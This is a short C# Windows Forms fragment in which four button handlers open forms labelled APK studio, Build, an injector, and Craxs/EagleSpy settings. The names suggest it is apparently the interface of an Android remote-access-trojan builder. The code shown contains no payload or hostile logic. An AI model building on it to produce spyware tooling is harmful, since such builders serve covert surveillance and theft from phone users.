    private void studiobtn_Click(object sender, EventArgs e)
    {
        Apk_studio apk_Studio = new Apk_studio();

        // Show Form2
        apk_Studio.Show();
    }

    private void Build_btn_Click(object sender, EventArgs e)
    {
        Build build = new Build();

        // Show Form2
        build.Show();
    }

    private void inject_btn_Click(object sender, EventArgs e)
    {
        Jector jector = new Jector();

        // Show Form2
        jector.Show();
    }

    private void Settings_btn_Click(object sender, EventArgs e)
    {
        CraxsSettinngs eagleSpySettinngs = new CraxsSettinngs();

        // Show Form2
        eagleSpySettinngs.Show();
    }
}





